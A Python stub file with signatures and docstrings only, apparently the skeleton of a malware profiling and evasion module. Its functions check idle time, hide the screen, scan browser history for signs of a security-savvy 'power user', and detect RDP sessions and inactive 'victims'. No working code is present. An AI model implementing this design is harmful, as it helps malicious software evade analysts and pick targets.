
def get_idle_duration() -> float :
    """
    this method return the number of seconds which the current pc is idle, as float.
    """


def prevent_sleep(enable=True) -> bool:
    """we are preventing/allowing sleep"""



def turn_screen_off() -> bool:
    """
    this function mimick an hibernate event, putting off you screens
    """


def turn_screen_on() -> bool: """ """



def getDefaultBrowser() -> tuple:
    """
    this function return tuple of (full_path_to_browser_exe,browser_name)
    """



def is_debug_in_history(urls : list) -> bool:
    """we return here true if we find one of those urls in the history
       as those can indicate we are messing with power user or even worse."""


def date_from_webkit(webkit_timestamp) : """ """


def dont_used_browser(last_visit_time) -> bool:
    """
    we return here true if the victim didn't used the browser for at least 2 days
    """


def parseFirefox_history(path : str) -> bool:
    """
    :param path: folder of profile
    """



def parseChrome_history(path : str) -> bool: """ """

def is_normal_browser_user(bType=False) -> bool:
    """
    :param bType: browser type, in string
    """



def get_keyboard_language() -> str:
    """
    Gets the keyboard language in use by the current
    active window process.
    """

def is_inside_rdp() -> bool:
    """returns bool indicating we are inside rdp session"""

def is_power_user() -> bool:
    """returns bool indicating if use is power user"""